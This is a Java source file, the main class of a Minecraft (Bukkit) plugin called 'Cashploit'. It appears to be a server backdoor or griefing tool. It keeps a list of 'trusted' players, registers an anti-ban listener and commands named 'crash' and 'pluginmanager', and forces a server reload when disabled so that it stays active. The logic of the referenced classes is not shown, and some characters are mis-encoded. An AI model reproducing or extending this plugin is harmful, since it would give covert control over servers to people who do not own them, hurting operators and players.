package de.cashploit5;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import de.cashploit5.command.CommandManager;
import de.cashploit5.command.TornadoCommand;
import de.cashploit5.command.TrustCommand;
import de.cashploit5.command.tab.CrashTabCompleter;
import de.cashploit5.command.tab.PluginManagerCompleter;
import de.cashploit5.events.AntiBANListener;
import de.cashploit5.events.ChatListener;
import de.cashploit5.events.JoinQuitListener;
import de.cashploit5.events.tab.TabListener;
import de.cashploit5.tornado.Tornado;

public class Cashploit extends Main {

	private static Cashploit plugin;

	public void onEnable() {
		plugin = this;
		registerConfig("trusted");
		new ChatListener(this);
		new AntiBANListener(this);
		new JoinQuitListener(this);
		new TabListener(this);

		setCommandManager(new CommandManager());

		registerTabCompleters();
		
		TornadoCommand.startTornadoScheduler();
	}
	
	public void onDisable() {
		for(Player all : Bukkit.getOnlinePlayers()) {
			if(TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())) {
				Main.sendMessage(all, "ßcKEINE COMMANDS EINGEBEN BIS DER RELOAD FERTIG IST!!!");
			}
		}
		Bukkit.reload();
		for(Player all : Bukkit.getOnlinePlayers()) {
			if(TrustCommand.getTrustedPlayers().contains(all.getUniqueId().toString())) {
				Main.sendMessage(all, "ßaReload beendet! Viel Spaﬂ");
			}
		}
		for(Tornado tornado : Tornado.tornados) {
			tornado.delete();
		}
		Tornado.tornados.clear();
	}

	public static Cashploit getPlugin() {
		return plugin;
	}

	private void registerTabCompleters() {
		getCashploitCommand("crash").setTabCompleter(new CrashTabCompleter());
		getCashploitCommand("pluginmanager").setTabCompleter(new PluginManagerCompleter());
	}
}
